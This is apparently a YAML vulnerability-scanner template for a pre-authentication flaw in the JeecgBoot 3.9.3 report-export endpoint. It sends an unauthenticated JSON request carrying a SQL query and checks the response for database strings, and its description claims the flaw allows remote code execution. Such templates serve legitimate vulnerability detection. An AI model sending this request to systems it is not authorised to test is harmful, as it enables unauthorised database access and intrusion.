name: poc-yaml-jeecgboot-jmreport-export-rce
groups:
  rce:
    - method: POST
      path: /jeecg-boot/jmreport/auto/export
      headers:
        Content-Type: application/json
      body: >-
        {"sql":"SELECT @@version","dbType":"mysql"}
      follow_redirects: false
      expression: >
        response.status == 200 && (response.body.bcontains(b"Microsoft SQL Server") || response.body.bcontains(b"ODBC") || response.body.bcontains(b"SQL"))
detail:
  author: L4xy
  description: "JeecgBoot 3.9.3存在pre-auth RCE漏洞，积木报表导出接口/jmreport/auto/export标注了@JimuNoLoginRequired注解导致未授权访问，可导致远程代码执行"
  links:
    - https://github.com/jeecgboot/JeecgBoot/issues/9837
  tags: rce,jeecgboot,jmreport